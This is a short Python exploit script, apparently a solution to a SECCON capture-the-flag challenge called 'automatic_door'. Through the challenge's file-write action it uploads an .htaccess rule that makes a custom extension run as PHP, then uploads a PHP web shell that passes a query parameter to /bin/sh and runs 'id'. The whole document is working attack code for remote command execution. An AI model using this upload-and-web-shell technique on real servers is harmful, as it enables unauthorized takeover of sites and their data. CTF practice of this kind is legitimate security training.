import requests

s = requests.session()

s.post('http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/',
       params={'action': 'write', 'filename': '.htaccess'},
       files={'file': ('x', 'AddType application/x-httpd-php .a')})

s.post('http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/',
       params={'action': 'write', 'filename': 'a.a'},
       files={'file': ('x', '''<?php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w")
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (is_resource($process)) {
    fwrite($pipes[0], $_GET['c'] . "\\n");
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    proc_close($process);
}

exit;
''')})

path = s.post('http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/', params={'action': 'pwd'}).text
print s.post('http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/' + path + 'a.a', params={'c': 'id'}).text
